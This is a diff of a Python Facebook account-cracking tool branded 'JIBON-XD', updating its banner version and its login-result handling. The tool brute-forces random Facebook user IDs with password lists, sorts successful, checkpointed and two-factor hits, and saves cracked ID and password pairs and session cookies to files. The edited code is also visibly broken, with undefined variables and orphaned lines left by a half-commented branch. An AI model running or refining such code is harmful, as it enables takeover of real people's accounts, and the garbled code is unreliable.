@@ -211,7 +211,7 @@ logo = ("""
   [~] FACEBOOK : MD JIBON ISLAM
   [~] FACEBOOK : JIBON SARKAR
   [~] TOOL     : BD RANDOM + \033[1;97m\033[1;45mSTARTED PROCESS 2 MIN\033[1;0m\033[1;97m\033[38;5;46m
-  [~] VERSION  : \033[1;97m\033[1;45m0.1\033[1;0m\033[1;97m\033[38;5;46m + \033[1;97m\033[1;45mFAST CLONE\033[1;0m\033[1;97m\033[38;5;46m
+  [~] VERSION  : \033[1;97m\033[1;45m0.2\033[1;0m\033[1;97m\033[38;5;46m + \033[1;97m\033[1;45mFAST CLONE\033[1;0m\033[1;97m\033[38;5;46m
   \x1b[1;96m----------------------------------------------""")
 
 #---------------------[LOOP MENU]---------------------#
@@ -321,7 +321,7 @@ def rcrack1(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r [\033[38;5;46mJIBON-XD\033[1;97m] [\033[38;5;45m%s\033[0m/%s | OK\033[1;97m:-\033[38;5;46m%s\033[1;97m | CP\033[1;97m:-\033[38;5;196m%s\033[1;97m | 2F\033[1;97m:-\033[38;5;45m%s\033[1;97m] \r'%(loop,tl,len(ok),len(cp),len(twf))),
+            sys.stdout.write('\r\33[1;97m[\33[1;92mJIBON-XD\33[1;97m]\33[1;94m [%s/%s] \33[1;92mOK:-%s\r'%(loop,tl,len(oks))),
             sys.stdout.flush()
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
@@ -358,37 +358,27 @@ def rcrack1(uid,pwx,tl):
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                coki1 = coki.split("1000")[1]
                 uid = "1000"+coki1[0:11]
-                #os.system("play-audio JIBON_OK.mp3")
-                print(f'\r\x1b[38;5;46m[JIBON-OK] '+uid+' | '+ps+ ' '+Jawnx(uid)+' ')
-            #    print(f" Cookie : {coki}")
-            #    cek_apk(session,coki)
-                open('/sdcard/JIBON-OK.txt', 'a').write(uid+' | '+ps+'\n')
-                oks.append(uid)
-            elif 'checkpoint' in log_cookies:
-                if 'Enter login code to continue' in log_cookies:
-                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    coki1 = coki.split("1000")[1]
-                    uid = "1000"+coki1[0:11]
-                    #os.system("play-audio JIBON_2F.mp3")
-                    print('\r\x1b[38;5;45m[JIBON-2F] '+uid+' | '+ps+' '+Jawnx(uid)+' ')
-                    open('/sdcard/JIBON-2F.txt', 'a').write(uid+' | '+ps+'\n')
-                    twf.append(uid)
-                else:
-                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    coki1 = coki.split("1000")[1]
-                    uid = "1000"+coki1[0:11]
-                  #  os.system("play-audio JIBON_CP.mp3")
-                    print(f'\r\x1b[38;5;191m[JIBON-CP] '+uid+' | '+ps+' '+Jawnx(uid)+' ')
-                    open('/sdcard/JIBON-CP.txt', 'a').write(uid+' | '+ps+'\n')
-                    cps.append(uid)
-                    break
+                print(f'\r\33[1;92m [JIBON-OK] '+uid+' | '+ps+'\33[0;92m')
+           #     os.system("play-audio m4.mp3")
+              #  print('\r\033[0;101mCOOKIE \033[0m=''\033[1;32m'+coki+'\033[0m''\033[0m')
+               # cek_apk(session,coki)
+                open('/sdcard/JIBON-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(cid);cek_apk(coki)
+                break
+          #  elif 'checkpoint' in log_cookies:
+              #  coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                uid = "1000"+coki1[0:11]
+                print('\r\r\33[1;34m JIBON-CP ' +uid+ ' • ' +ps+           '  \33[0;97m')
+                open('/sdcard/JIBON-cp.txt', 'a').write( uid+' | '+ps+' \n')
+               # cps.append(cid)
+            elif twf in session.cookies.get_dict().keys():
+                print('\033[1;93m\033[0;34mJIBON-2F '+uid+' • '+ps+'  \033[0;97m')
+                break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f' \r\033[m[ JIBON ] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
-        sys.stdout.flush()
     except:
         pass
+ 
 Main()
